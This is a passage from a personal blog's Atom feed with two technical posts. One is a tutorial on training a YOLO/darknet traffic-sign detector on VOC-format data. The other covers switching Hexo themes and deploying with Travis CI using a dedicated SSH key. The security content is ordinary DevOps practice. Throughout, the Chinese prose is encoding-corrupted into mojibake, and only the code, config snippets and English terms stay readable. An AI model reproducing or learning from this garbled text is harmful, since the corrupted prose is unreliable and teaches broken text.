å¤§è‡´çš„å¥—è·¯ï¼Œå…¶å®è¯´åˆ°åº•å°±æ˜¯å„ç§å·ç§¯å±‚ï¼ˆconvolution layerï¼‰ï¼Œæ± åŒ–å±‚ï¼ˆpooling layerï¼‰ï¼Œå…¨è¿æ¥å±‚ï¼ˆfool connected layerï¼‰ä¸æ–­ç»„åˆã€‚</p><p>æ„Ÿè§‰æœºå™¨å­¦ä¹ æƒ³è¦æ·±å…¥äº†è§£ï¼Œå¯èƒ½éœ€è¦çœ‹å¾ˆå¤šç›¸å…³çš„è®ºæ–‡ï¼Œä¹‹åçš„å­¦ä¹ è·¯ç¨‹å°±è®°å½•åœ¨ä¹‹åçš„åšå®¢ä¸­å¥½äº†ã€‚</p><p>å…ˆè¯´è¯´ç”²æ–¹çš„éœ€æ±‚ï¼šéœ€è¦åœ¨è¡Œè½¦è¿‡ç¨‹ä¸­åŠ¨æ€è¯†åˆ«å‡ºå‰æ–¹äº¤é€šæ ‡å¿—ï¼Œå¦‚æœæ˜¯é™é€Ÿæ ‡è¯†ï¼Œéœ€è¦è¯†åˆ«ä¸­é‡Œé¢çš„æ•°å­—ã€‚</p><p>æœ€è¿‘åªåšäº†ç¬¬ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯äº¤é€šæ ‡å¿—çš„è¯†åˆ«ã€‚å¯¹å·ç§¯ç¥ç»ç½‘ç»œæœ‰è¿‡äº†è§£çš„è¯èƒ½æ„Ÿè§‰å‡ºæ¥è¿™å°±æ˜¯ä¸€ä¸ªåˆ†ç±»é—®é¢˜ï¼Œå¥½åœ¨å…¬å¸å·²ç»æ ‡å¥½äº†æ•°æ®ï¼Œå¹¶ä¸”æ˜¯æŒ‰ç…§ VOC æ ¼å¼æ ‡è®°çš„ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ä½¿ç”¨ç°æˆçš„ç½‘ç»œè®­ç»ƒå°±å¯ä»¥äº†ã€‚</p><p>æˆ‘ç”¨çš„æ˜¯ YOLO åœ¨darknet ç½‘ç«™ä¸Šæœ‰ v1 å’Œ v2 ä¸¤ä¸ªç‰ˆæœ¬ã€‚</p><p><a href="https://pjreddie.com/darknet/yolo/" target="_blank" rel="noopener">https://pjreddie.com/darknet/yolo/</a></p><p>ä»¥ä¸Šæ˜¯ YOLO darknet ç‰ˆæœ¬çš„å®˜ç½‘ï¼Œä¸Šé¢çš„è¯´æ˜éå¸¸è¯¦ç»†ï¼Œä¹Ÿéå¸¸äººæ€§åŒ–ï¼Œå³ä½¿æ²¡æœ‰ GPU ä¹Ÿå¯ä»¥ä½¿ç”¨ï¼Œå¯ä»¥ç®€å•çš„æŒ‰ç…§ä¸Šé¢çš„æ•™ç¨‹è¿›è¡Œå®‰è£…ã€‚</p><p>æ³¨æ„ï¼Œ<code>darknet</code> é»˜è®¤æ˜¯ä¸å¼€å¯ <code>GPU</code> çš„ï¼Œå½“ç„¶è¿™å¯¹æ²¡æœ‰ <code>GPU</code> çš„äººï¼ˆæ¯”å¦‚æˆ‘â€¦ï¼‰æ˜¯å¾ˆå‹å¥½çš„ï¼Œä½†è¿™å¹¶ä¸å½±å“ <code>CPU</code> è®­ç»ƒç½‘ç»œæ…¢çš„è¦æ­»çš„äº‹å®ã€‚å¦‚æœæƒ³è¦å¼€å¯å¯¹ <code>GPU</code> çš„æ”¯æŒï¼Œåœ¨ <code>Makefile</code> æœ€ä¸Šé¢å¼€å¯å¯¹ <code>GPU</code> å’Œ <code>CUDNN</code> çš„æ”¯æŒå°±å¯ä»¥äº†</p><pre><code>GPU=0 // å¼€å¯GPUï¼Œä½¿ç”¨ nvidia-smi æ¥æŸ¥çœ‹æœ¬æœº GPU ä½¿ç”¨æƒ…å†µCUDNN=0 // å¼€å¯CUDAï¼Œè¯·ç¡®ä¿äº‹å…ˆå®‰è£…å¥½äº†CUDAï¼Œå¯ä»¥è¿è¡Œ nvcc -V æ¥æŸ¥çœ‹OPENCV=0 // å¼€å¯åå¯ä»¥ç›´æ¥æŸ¥çœ‹é¢„æµ‹åçš„å›¾ç‰‡OPENMP=0DEBUG=0</code></pre><p>å¦‚æœé¡ºåˆ©ï¼Œæ­¤æ—¶ä½ å·²ç»å¯ä»¥ä½¿ç”¨ darknet é¢„å…ˆè®­ç»ƒå¥½çš„ YOLO æ¨¡å‹æ£€æµ‹å‡ºäº†æ ·ä¾‹ä¸­çš„ç‰©ä½“ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬è¦å°è¯•ä½¿ç”¨è‡ªå·±çš„æ•°æ®è®­ç»ƒã€‚</p><p>å…³äº VOC æ•°æ®é›†çš„è®­ç»ƒåœ¨å®˜ç½‘çš„æ•™ç¨‹ä¸Šé¢ä¹Ÿæœ‰æåˆ°ã€‚</p><pre><code>./darknet detector train cfg/voc.data cfg/yolo-voc.cfg darknet19_448.conv.23</code></pre><p>ä¸€åˆ‡å‡†å¤‡å·¥ä½œå°±ç»ªåï¼Œä¸Šé¢çš„å·¥ä½œä¼šå¼€å§‹è®­ç»ƒï¼Œä¸è¿‡ä½ å¤§æ¦‚ä¼šå¤±è´¥ï¼Œå› ä¸ºæœ‰ä¸€äº›å‘å®˜ç½‘å¹¶æ²¡æœ‰æåˆ°ã€‚</p><p>é¦–å…ˆåœ¨ voc.data é‡Œé¢</p><pre><code>classes= 20train  = &lt;your work directory&gt;/darknet/train.txtvalid  = &lt;your work directory&gt;/darknet/2007_test.txtnames = data/voc.namesbackup = backup</code></pre><p>è¿™é‡Œçš„ backup æ˜¯åœ¨è®­ç»ƒå·¥ç¨‹ä¸­æƒé‡æ–‡ä»¶å‚¨å­˜çš„ä½ç½®ï¼Œéœ€è¦æå‰åˆ›å»ºå¥½è¿™ä¸ªæ–‡ä»¶å¤¹</p><p>è¿˜éœ€è¦ç¼–è¾‘ä¸€ä¸‹ cfg/yolo-voc.cfg è¿™ä¸ªæ–‡ä»¶ï¼Œå°†å‰å‡ è¡Œçš„ test æ¬¡æ”¹æˆ train</p><pre><code>[net]# Testing //æ³¨é‡Šåˆ°æµ‹è¯•çš„éƒ¨åˆ†ï¼Œå°†è®­ç»ƒéƒ¨åˆ†å–æ¶ˆæ³¨é‡Š#batch=1#subdivisions=1# Trainingbatch=64subdivisions=8height=416width=416channels=3momentum=0.9decay=0.0005angle=0saturation = 1.5exposure = 1.5hue=.1</code></pre><p>ç„¶ååº”è¯¥å°±ä¸ä¼šæœ‰é—®é¢˜äº†ï¼Œè¿™é‡Œå»ºè®®å¤§å®¶ç”¨ GPU æœåŠ¡å™¨å»è®­ç»ƒï¼Œä¸è¦å¤´é“ç”¨ CPU å»å°è¯•ï¼Œä¸ç„¶ä½ ä¼šç­‰åˆ°å¤©è’åœ°è€ã€‚</p><p>è®­ç»ƒç»“æŸåçš„æƒé‡æ–‡ä»¶åœ¨ backup æ–‡ä»¶å¤¹ä¸­ä¼šæœ‰ä¿å­˜ï¼ŒæŒ‰ç…§å®˜ç½‘çš„ä¾‹å­è¿è¡Œå°±å¯ä»¥äº†</p><hr><p>ç„¶åè¯´è¯´è‡ªå·±çš„æ•°æ®é›†æ€ä¹ˆè®­ç»ƒï¼Œå…¬å¸ç»™çš„æ•°æ®é›†æ˜¯æŒ‰ç…§ VOC çš„æ ¼å¼æ ‡æ³¨çš„ï¼Œè™½ç„¶æœ‰ä¸€ç‚¹ä¸ä¸€æ ·ï¼Œä¸è¿‡æ€»ä½“ä¸Šå·²ç»è§£å†³å¾ˆå¤šé—®é¢˜äº†ï¼Œåœ¨è½¬æ¢ VOC æ•°æ®é›†çš„æ—¶å€™ï¼Œå®˜æ–¹æä¾›äº†ä¸€ä¸ªè„šæœ¬ <code>voc_label.py</code> æˆ‘ä»¬ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><p><strong>å¼ºçƒˆå»ºè®®å¤§å®¶å¤åˆ¶ä¸€ä»½é…ç½®æ–‡ä»¶å‡ºæ¥ï¼Œä¸è¦ç›´æ¥åœ¨åŸæ–‡ä»¶ä¿®æ”¹</strong></p><p>é¦–å…ˆæˆ‘ä»¬æ¥çœ‹çœ‹åœ¨è®­ç»ƒ VOC çš„æ•°æ®é›†ä¸­ï¼Œdarknet éƒ½ç”¨åˆ°äº†ä»€ä¹ˆã€‚</p><p>åœ¨ cfg/voc.data ä¸­</p><pre><code>classes= 20train  = &lt;your work directory&gt;/darknet/train.txtvalid  = &lt;your work directory&gt;/darknet/2007_test.txtnames = data/voc.namesbackup = backup</code></pre><p>classes å‚æ•°éœ€è¦æ”¹æˆä½ çš„æ•°æ®é›†ä¸­å…·ä½“çš„åˆ†ç±»æ•°ç›®ï¼Œä¸‹é¢ç”¨æ¥è®­ç»ƒå’Œæµ‹è¯•çš„å›¾ç‰‡åˆ—è¡¨éƒ½æ˜¯æœ‰ä¸Šè¿°çš„è„šæœ¬è‡ªåŠ¨ç”Ÿæˆçš„ï¼Œvoc.names é‡Œé¢ä¿å­˜äº†æ‰€æœ‰åˆ†ç±»ã€‚æ‰“å¼€ <code>train.txt</code> å¯ä»¥çœ‹åˆ°é‡Œé¢ä¿å­˜çš„æ˜¯ç”¨æ¥è®­ç»ƒçš„å›¾ç‰‡çš„ç»å¯¹è·¯å¾„ï¼Œä½†æ˜¯ï¼ŒçœŸæ­£çš„æ ‡æ³¨ä¿¡æ¯å´æ²¡æœ‰ä½“ç°ï¼Œä¹Ÿå°±æ˜¯ <code>VOCdevkit/VOC2007/labels</code> ä¸‹é¢çš„æ ‡ç­¾æ–‡ä»¶ã€‚æœ¬æ¥ç™¾æ€ä¸å¾—å…¶è§£ï¼Œåæ¥å‘ç°æ˜¯åœ¨æºç ä¸­å†™æ­»çš„ï¼Œåœ¨<code>src/data.c</code> ä¸­æœ‰ã€‚</p><pre><code class="c">find_replace(path, &quot;images&quot;, &quot;labels&quot;, labelpath);find_replace(labelpath, &quot;JPEGImages&quot;, &quot;labels&quot;, labelpath);</code></pre><p><strong>ä¹Ÿå°±æ˜¯è¯´ä»–ä¼šæ ¹æ® <code>train.txt</code> ä¸­å›¾ç‰‡çš„è·¯å¾„ï¼Œæ›¿æ¢ <code>JPEGImages</code> ä¸º<code>labels</code> ä½œä¸ºæ ‡ç­¾è·¯å¾„ï¼Œå› æ­¤åœ¨ç”Ÿæˆæ ‡ç­¾çš„æ—¶å€™ä¸€å®šè¦è®©æ ‡ç­¾ç›®å½•ä¸å›¾ç‰‡ç›®å½•åŒçº§ã€‚</strong></p><p>å¦‚æœä½ æ ¹æ®ä½ çš„æ•°æ®æ­£ç¡®ä¿®æ”¹äº† <code>voc_label.py</code> è¿™ä¸ªè„šæœ¬æ–‡ä»¶ï¼Œé‚£ä¹ˆä½ çš„å‡†å¤‡å·¥ä½œåº”è¯¥å·²ç»æ¥è¿‘å°¾å£°äº†ã€‚ï¼ˆè®­ç»ƒæ•°æ®å’Œæµ‹è¯•æ•°æ®æŒ‰ç…§ 10 : 1 çš„æ¯”ç‡åˆ’åˆ†ï¼‰</p><p>æœ€åä¿®æ”¹ä¸€äº›ç½‘ç»œä¸­çš„å‚æ•°å°±å¯ä»¥äº†ã€‚</p><p><code>cfg/voc.data</code> é‡Œé¢çš„ <code>classes</code> æ”¹æˆä½ çš„åˆ†ç±»æ•°é‡ï¼Œ<code>voc.names</code> é‡Œé¢å­˜å¥½å…·ä½“åˆ†ç±»çš„åç§°ï¼Œç„¶åä¿®æ”¹ <code>cfg/yolo-voc.2.0.cfg</code> </p><pre><code>[convolutional]...filters=5*(N+5)...classes=N...</code></pre><p>ä¿®æ”¹ä¸Šé¢ä¸¤ä¸ªå‚æ•°å³å¯ï¼Œå…¶ä»–å‚æ•°å¯ä»¥æŒ‰éœ€ä¿®æ”¹ã€‚</p><p>ä¹‹åæŒ‰ç…§åŒæ ·çš„æ“ä½œè®­ç»ƒå³å¯</p><p>ç®€å•è¯´ä¸€ä¸‹è®­ç»ƒçš„æ—¶å€™çš„è¾“å‡º</p><pre><code>Region Avg IOU: 0.432582, Class: 0.452631, Obj: 0.143766, No Obj: 0.005994, Avg Recall: 0.391304,  count: 23623: 14.499426, 14.887394 avg, 0.001000 rate, 1.074940 seconds, 39872 images</code></pre><p> åœ¨è®­ç»ƒçš„æ—¶å€™ä¼šæœ‰è¿™äº›ä¿¡æ¯åœ¨æ§åˆ¶å°æ‰“å‡ºï¼Œç®€å•è¯´ä¸‹è¿™äº›ä¸œè¥¿çš„å«ä¹‰</p><p><code>Region Avg IOU</code> äº¤å¹¶æ¯”ï¼Œå³æ£€æµ‹å‡ºçš„æ¡†æ¡†å’Œæ ‡æ³¨çš„æ¡†æ¡†ç›¸äº¤ç¨‹åº¦ï¼ŒæœŸæœ›è¶‹è¿‘äº 1</p><p><code>Avg Recall</code> å¹³å‡å¬å›ç‡ï¼Œå³æ£€æµ‹å‡ºç‰©ä½“çš„ä¸ªæ•°é™¤ä»¥æ ‡æ³¨çš„æ‰€æœ‰ç‰©ä½“ä¸ªæ•°ï¼ŒæœŸæœ›è¶‹è¿‘äº 1</p><p><code>count</code> æ ‡æ³¨çš„ç‰©ä½“ä¸ªæ•°</p><p>æœ€åä¸€è¡Œçš„æ ¼å¼ï¼š</p><p>&lt;è¿­ä»£æ¬¡æ•°&gt; : &lt; train loss &gt;, &lt; avg train loss &gt;, &lt;å­¦ä¹ ç‡&gt; â€¦</p><p>åæ­£æˆ‘ä¸»è¦å…³å¿ƒå¬å›ç‡å’ŒæŸå¤±</p><p>æ®è¯´ä¸€ä¸ªæ¨¡å‹è®­ç»ƒè¦å¾ˆé•¿æ—¶é—´ï¼Œå¦‚æœä½ ä¸å°å¿ƒé€€å‡ºäº†ï¼Œæ²¡å…³ç³»ï¼Œ<code>backup/yolo2.backup</code> è¿™ä¸ªæ–‡ä»¶æ˜¯å®æ—¶å¤‡ä»½çš„ï¼Œæ‰€ä»¥åªéœ€è¦ä»è¿™ä¸ªå¤‡ä»½ç‚¹é‡æ–°å¼€å§‹å°±å¯ä»¥äº†</p><pre><code>./darknet detector train cfg/catarc.data cfg/yolo2.0-catarc.cfg backup/yolo2.backup -gpus 0,1</code></pre><p>å‚è€ƒåšå®¢</p><ul><li><a href="http://blog.csdn.net/jinlong_xu/article/details/75577007" target="_blank" rel="noopener">ã€YOLOã€‘è¯¦è§£ï¼šYOLO-darknetè®­ç»ƒè‡ªå·±çš„æ•°æ®</a></li><li><a href="http://blog.csdn.net/dcrmg/article/details/78496002" target="_blank" rel="noopener">darknet YOLOv2å®‰è£…åŠæ•°æ®é›†è®­ç»ƒ</a></li><li><a href="http://blog.csdn.net/renhanchi/article/details/71077830" target="_blank" rel="noopener">ã€Darknetã€‘ã€yolo v2ã€‘è®­ç»ƒè‡ªå·±æ•°æ®é›†çš„ä¸€äº›å¿ƒå¾—â€”-VOCæ ¼å¼</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;æœ€è¿‘è¢«å®‰æ’åˆ°ä¸­æ±½ç ”å®ä¹ ï¼ˆå°±ç®—æ˜¯å®ä¹ å§ï¼‰ï¼Œåšäº†ä¸€äº›åŸºäºæ·±åº¦å­¦ä¹ çš„å›¾åƒè¯†åˆ«å·¥ä½œï¼Œå…¶å®è¯´èµ·æ¥è‡ªå·±å¯¹æ·±åº¦å­¦ä¹ ä¹Ÿæ²¡ä»€ä¹ˆå¤ªæ·±å…¥çš„äº†è§£ï¼Œéƒ½æ˜¯ç°å­¦ç°å–ï¼Œè·‘äººå®¶çš„ä¾‹å­ã€‚ä¸è¿‡è¿˜æ˜¯åœ¨è¿™è¾¹è®°å½•ä¸€ä¸‹ï¼Œä»¥åå›é¦–å¯ä»¥ç¨ç¨æ„Ÿæ…¨ä¸€ä¸‹å¹´è½»æ—¶çš„æ— çŸ¥ã€‚&lt;/p&gt;
&lt;p&gt;å…³äºæœºå™¨å­¦ä¹ ï¼ŒåŸºç¡€çŸ¥è¯†æ˜¯çœ‹&lt;em&gt;å‘¨å¿—åçš„è¥¿ç“œ
      
    
    </summary>
    
      <category term="ä¸ªäººæ—¥è®°" scheme="https://blog.liebes.top/categories/%E4%B8%AA%E4%BA%BA%E6%97%A5%E8%AE%B0/"/>
    
    
      <category term="machine learning" scheme="https://blog.liebes.top/tags/machine-learning/"/>
    
      <category term="darknet" scheme="https://blog.liebes.top/tags/darknet/"/>
    
  </entry>
  
  <entry>
    <title>Hexo æ›´æ¢ materail ä¸»é¢˜ï¼Œä½¿ç”¨ Travis æŒç»­é›†æˆ</title>
    <link href="https://blog.liebes.top/2018/01/25/hexo-material/"/>
    <id>https://blog.liebes.top/2018/01/25/hexo-material/</id>
    <published>2018-01-25T18:27:00.000Z</published>
    <updated>2019-08-04T12:56:30.278Z</updated>
    
    <content type="html"><![CDATA[<p>æ˜¯çš„ï¼Œæˆ‘æŠ˜è…¾äº†ä¸€å¤©æŠŠåšå®¢çš„æ¨¡ç‰ˆæ¢äº†ä¸€ä¸‹ã€‚æ€ä¹ˆè¯´å‘¢ï¼Œä¹‹å‰ç”¨çš„ Next ä¸»é¢˜ï¼Œå¾ˆç®€çº¦ï¼Œçœ‹èµ·æ¥ä¹Ÿå¾ˆèˆ’æœï¼Œä½†æ€»è§‰å¾—å°‘ç‚¹ä»€ä¹ˆï¼Œåæ¥é€›äº†é€›å…¶ä»–äººçš„ç«™ï¼Œæ„Ÿè§‰ Next ä¸»é¢˜æ²¡æœ‰å›¾ï¼Œè§†è§‰ä¸Šæ²¡ä»€ä¹ˆå†²å‡»åŠ›ï¼Œç°è’™è’™çš„æ„Ÿè§‰ï¼Œäºæ˜¯é‡‡ç”¨äº† material è¿™ä¸ªä¸»é¢˜ï¼Œä¹Ÿå¾ˆç®€æ´ï¼Œç›¸æ¯”ä¹‹ä¸‹è‰²å½©ä¸°å¯Œä¸€äº›ã€‚</p><p>ä¹‹å‰åœ¨ä½¿ç”¨ github pages æœ‰ä¸€äº›ä¸çˆ½çš„åœ°æ–¹å°±æ˜¯åœ°å€ä¸æ˜¯è‡ªå·±çš„åŸŸåï¼Œç„¶è€Œå®å®æ˜¯ä¹°äº†åŸŸåçš„ï¼Œä¸ºä»€ä¹ˆè¦åœ¨ github ä¸‹å¼„å‘¢ï¼Œä¹‹å‰å°è¯•è¿‡ä½¿ç”¨CNAMEè¿›è¡ŒåŸŸåè§£æï¼Œä½†æ˜¯åœ¨å¤„ç† https çš„é—®é¢˜ä¸Šæ¯”è¾ƒéº»çƒ¦ï¼Œæƒ³ç€å¼„ä¸€å¥— CIæµç¨‹å‡ºæ¥ã€‚è¯•è¿‡ hexo çš„ deploy æ’ä»¶ï¼Œç”¨ rsync è¿›è¡Œè‡ªåŠ¨éƒ¨ç½²ï¼Œç„¶è€Œæœªæœï¼Œå„ç§å¥‡æ€ªçš„é—®é¢˜å¼„çš„å¤´ç—›ã€‚æœ€è¿‘å¿ƒè¡€æ¥æ½® google ä¸€ç•ªï¼Œå‘ç°å¥½å¤šäººéƒ½åœ¨ç”¨Travis CI æ¥è‡ªåŠ¨åŒ–éƒ¨ç½²ï¼Œäºæ˜¯å°è¯•äº†ä¸€ä¸‹ï¼Œæ•ˆæœå¾ˆä¸é”™ã€‚</p><p>å¤§è‡´æ•´ç†æ•´ç†å®‰è£…çš„è¿‡ç¨‹å§ï¼Œåœ¨é˜…è¯»ä¸‹é¢çš„æ–‡å­—ä¹‹å‰ï¼Œä½ éœ€è¦è‡ªå·±å®‰è£…è¿‡ä¸€æ¬¡hexoï¼Œå¹¶äº†è§£hexoã€‚</p><h2 id="HEXO-MATERIAL-ä¸»é¢˜æ›´æ¢"><a href="#HEXO-MATERIAL-ä¸»é¢˜æ›´æ¢" class="headerlink" title="HEXO MATERIAL ä¸»é¢˜æ›´æ¢"></a>HEXO MATERIAL ä¸»é¢˜æ›´æ¢</h2><p>ä» github ä¸Šä¸‹è½½ material ä¸»é¢˜ï¼š<a href="https://github.com/viosey/hexo-theme-material" target="_blank" rel="noopener">https://github.com/viosey/hexo-theme-material</a> ä¸‹è½½ release æˆ–è€…ç›´æ¥å…‹éš†é¡¹ç›®å‡å¯ï¼Œå°†ä¸»é¢˜åŒ…ç§»åŠ¨åˆ° hexo é¡¹ç›®çš„ theme ä¸­å¹¶ä¿®æ”¹åšå®¢é…ç½®æ–‡ä»¶ <code>_config.yml</code></p><pre><code>theme: material</code></pre><p>æ­¤æ—¶è¿è¡Œ  <code>hexo s</code> åœ¨æœ¬åœ°å°±å¯ä»¥é¢„è§ˆåˆ° material ä¸»é¢˜çš„æ ·å¼äº†ã€‚æ¥ä¸‹æ¥çš„æ­¥éª¤ï¼Œå®Œå…¨å¯ä»¥æŒ‰ç…§å®˜æ–¹çš„æ•™ç¨‹ä¸€é¡¹ä¸€é¡¹è®¾ç½®ï¼Œä¸è¦å«Œéº»çƒ¦ï¼Œå› ä¸ºå¾ˆå¤šç‰¹æ€§é»˜è®¤éƒ½æ˜¯æ²¡æœ‰çš„ï¼Œéœ€è¦è‡ªå·±å»æ‰“å¼€ã€‚</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://material.viosey.com/docs/#/" target="_blank" rel="noopener">https://material.viosey.com/docs/#/</a></p><p>ä¸‹é¢è®°å½•çš„æ˜¯ä¸€äº›åœ¨å®‰è£…æ—¶éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼Œè¯·å…ˆé˜…è¯»ä¸€éå®˜æ–¹æ–‡æ¡£ï¼Œå†æ¥ç€è¿›è¡Œã€‚</p><p><strong>å…³äºé¦–é¡µicon</strong></p><p>æœ‰ä¸€ä¸ªå¥½çš„ icon å¯ä»¥è®©åšå®¢çœ‹ä¸Šå»ç¾è§‚å¾ˆå¤šï¼Œè¿™é‡Œæ¨èä¸€ä¸ªç½‘ç«™ï¼Œæœ‰å¾ˆå¤šä¸é”™çš„å›¾ï¼Œè€Œä¸”å¯ä»¥DIVã€‚</p><p><a href="https://www.canva.com/" target="_blank" rel="noopener">https://www.canva.com/</a></p><p><strong>å…³äºä¾§è¾¹æ icon</strong></p><p>æœ€å¼€å§‹é»˜è®¤çš„ä¾§è¾¹æ åªæœ‰ä¸»é¡µå’Œå½’æ¡£ï¼Œçœ‹ç€ç©ºå” å” çš„ã€‚å¦‚æœä½ æŒ‰ç…§æ–‡æ¡£è¿›è¡Œï¼Œåº”è¯¥ä¼šå°†æ ‡ç­¾äº‘ã€åˆ†ç±»ã€æ—¶é—´è½´ç­‰ç­‰éƒ½åŠ ä¸Šï¼Œä½†æ˜¯å¯¹åº”çš„ icon åˆä¸èƒ½ç©ºç€ï¼Œå¯ä»¥å»è¿™é‡Œæ‰¾ç›¸åº”çš„ icon</p><p><a href="https://material.io/icons/" target="_blank" rel="noopener">https://material.io/icons/</a></p><p><strong>å…³äºç›¸å†Œ</strong></p><p>è¿™ä¸ªåŠŸèƒ½å¯èƒ½æ˜¯æˆ‘æœ€å–œæ¬¢çš„äº†ï¼Œå¯ä»¥å°†ä¸€äº›ç”Ÿæ´»ä¸Šçš„ç…§ç‰‡æ”¾è¿›æ¥ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€äº›é—®é¢˜ã€‚</p><p>é¦–å…ˆæ˜¯å›¾ç‰‡å¤§å°çš„é—®é¢˜ï¼Œå¤ªå¤§çš„å›¾ç‰‡ä¼šè®©è¿™ä¸ªå•å¶å¥‡å¡æ— æ¯”ï¼Œéšæ„åœ¨ä¸Šä¼ å›¾ç‰‡ä¹‹å‰å¼ºçƒˆå»ºè®®è¿›è¡Œå‹ç¼©ï¼Œæˆ–è€…ä½¿ç”¨ä¸€äº›å›¾ç‰‡CDNåŠ é€Ÿã€‚</p><p>ç„¶åå°±æ˜¯ç›¸å†Œå¯¹ç«–ç‰ˆå›¾ç‰‡æ”¯æŒçš„å¹¶ä¸å¥½ï¼Œå°½é‡ä¼ æ¨ªæ¿å§ï¼ŒæœŸå¾…ä½œè€…çš„æ›´æ–°</p><p><strong>å…³äºç¬¬ä¸‰æ–¹æœåŠ¡</strong></p><p>material ä¸»é¢˜å†…åµŒäº†å¾ˆå¤šç¬¬ä¸‰æ–¹æ”¯æŒï¼ŒæŒ‰ç…§æ–‡æ¡£ï¼Œå»å¯¹åº”çš„ç¬¬ä¸‰æ–¹ç½‘ç«™æ³¨å†Œå°±è¡Œã€‚è¯„è®ºçš„ç¬¬ä¸‰æ–¹æ”¯æŒæˆ‘ç”¨çš„ç•…è¨€ï¼Œè™½ç„¶æƒ³ç”¨disqusï¼Œä½†æ˜¯è€ƒè™‘åˆ°å›½å†…çš„å¤§å¢™ï¼Œè¿˜æ˜¯ç®—äº†ã€‚</p><h2 id="ä½¿ç”¨-TRAVIS-CI-æŒç»­é›†æˆ"><a href="#ä½¿ç”¨-TRAVIS-CI-æŒç»­é›†æˆ" class="headerlink" title="ä½¿ç”¨ TRAVIS CI æŒç»­é›†æˆ"></a>ä½¿ç”¨ TRAVIS CI æŒç»­é›†æˆ</h2><p>è¿™ä¸ªå¯ä»¥è¯´é˜…è¯»äº†å¥½å¤šå¥½å¤šåšå®¢äº†ï¼Œè¿™é‡Œå°±ä¸å†æŠ„ä¸€éåˆ«äººå®¶çš„äº†</p><p><a href="https://segmentfault.com/a/1190000009054888" target="_blank" rel="noopener">https://segmentfault.com/a/1190000009054888</a></p><p>è¿™ç¯‡åšå®¢é‡Œé¢è®²çš„å°±å¾ˆè¯¦å°½äº†ï¼Œä¸‹é¢è®°å½•ä¸€äº›è‡ªå·±é‡åˆ°çš„é—®é¢˜</p><p><strong>å…³äºgem å®‰è£…travisæŠ¥é”™</strong></p><p>è¿™ä¸ªä¸€èˆ¬æ˜¯ ruby ç‰ˆæœ¬æˆ–è€…ä¾èµ–çš„é—®é¢˜ï¼Œubuntu ä¸‹æˆ‘å®‰è£…äº†ä¸‹é¢å‡ ä¸ªä¾èµ–</p><pre><code>- ruby-dev- gcc- libffi-dev- make</code></pre><p>macOS ä¸‹ç›´æ¥æ›´æ–°äº† ruby å°±å¯ä»¥äº†</p><pre><code>brew updatebrew install ruby</code></pre><p><strong>å…³äºæœåŠ¡å™¨è°œé’¥è®¤è¯</strong></p><p>åŸºæœ¬åŸç†æ˜¯å°†ä½ ç”µè„‘çš„ ssh è°œé’¥åŠ å¯†ä¼ åˆ° travis ä¸Šå»ï¼Œåœ¨è¿›è¡ŒæœåŠ¡å™¨è¿æ¥æ—¶ travis å¯¹è°œé’¥è¿›è¡Œè§£å¯†ï¼Œç„¶åæ¥ä¸‹æ¥çš„æµç¨‹å°±è·Ÿä½¿ç”¨ ssh è°œé’¥è®¿é—®ä¸»æœºçš„æ–¹æ³•ä¸€æ ·äº†ã€‚</p><p>æŒ‰ç…§åšå®¢ä¸Šé¢çš„æ–¹æ³•ï¼Œä¼šè¦æ±‚å°†ä½ æœ¬åœ°çš„é»˜è®¤ssh è°œé’¥  <code>~/.ssh/id_rsa</code> åŠ å¯†ä¼ ä¸Šå»ï¼Œä½†è¿™å°±ä¼šå¸¦æ¥ä¸€ä¸ªé—®é¢˜ï¼Œä¸€èˆ¬ä¸ºäº†å®‰å…¨ï¼Œéƒ½ä¼šç»™è°œé’¥è®¾ç½®ä¸€ä¸ªå£ä»¤ï¼Œä½†æ˜¯ CI ä¸­æ²¡æ³•è®©ä½ è¾“å…¥å£ä»¤ã€‚è§£å†³åŠæ³•ä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦æ–°ç”Ÿæˆä¸€ä¸ªè°œé’¥ï¼Œ<code>ssh-keygen -f ~/.ssh/travis</code> è¿™æ ·å°±ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªæ–°çš„ç§é’¥å’Œå…¬é’¥ï¼Œå°†å…¬é’¥å†™åˆ°æœåŠ¡å™¨çš„ <code>authorized_keys</code> é‡Œé¢ï¼Œä¸Šä¼ çš„æ—¶å€™å°†æ–°ç”Ÿæˆçš„ç§é’¥åŠ å¯†ä¼ åˆ°ä»“åº“å³å¯ã€‚</p><p>åœ¨éƒ¨ç½²è„šæœ¬é‡Œé¢ï¼Œå»ºè®®å°†è§£å¯†åçš„ç§˜è¦ä»¥é»˜è®¤çš„å½¢å¼ <code>~/.ssh/id_rsa</code> ä¿å­˜ï¼Œè™½ç„¶åœ¨ rsync è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨ <code>ssh -i ~/.ssh/travis</code> æ¥åˆ¶å®šå…·ä½“ä½¿ç”¨çš„è°œé’¥ï¼Œä½†åœ¨å®è·µéƒ¨ç½²ä¸­æ€»æ˜¯æç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ï¼Œå…·ä½“å¯ä»¥å‚è§ <a href="https://github.com/wanghaichi/wanghaichi.github.io/blob/hexo/.travis.yml" target="_blank" rel="noopener">.travis.yml</a></p><p>ä¸Šé¢çš„éƒ¨ç½²è„šæœ¬å»ºè®®ä¸è¦æ‹¿è¿‡æ¥ç›´æ¥ç”¨ï¼Œå¦‚æœä½ çš„ hexo ä¸­å¼€å¯äº†å…¶ä»–çš„ç»„ä»¶ï¼Œè®°å¾—åœ¨éƒ¨ç½²è„šæœ¬é‡Œé¢å®‰è£…ã€‚</p><p>æœ€åï¼Œå¦‚æœä½ çš„åšå®¢è¿˜æ²¡æœ‰å¤‡ä»½ï¼Œè¯·ä¸€å®šå»å¤‡ä»½ä¸€ä¸‹ã€‚ä½ ä¸€å®šä¼šå‘ç°æˆ‘çš„ git ä»“åº“åˆä¸¤ä¸ªåˆ†æ”¯ï¼ŒCIçš„è§¦å‘åˆ†æ”¯æ˜¯ hexo è€Œä¸æ˜¯ masterã€‚æ•™ç¨‹é“¾æ¥ï¼š <a href="/2017/03/17/hexo-backup/">hexo 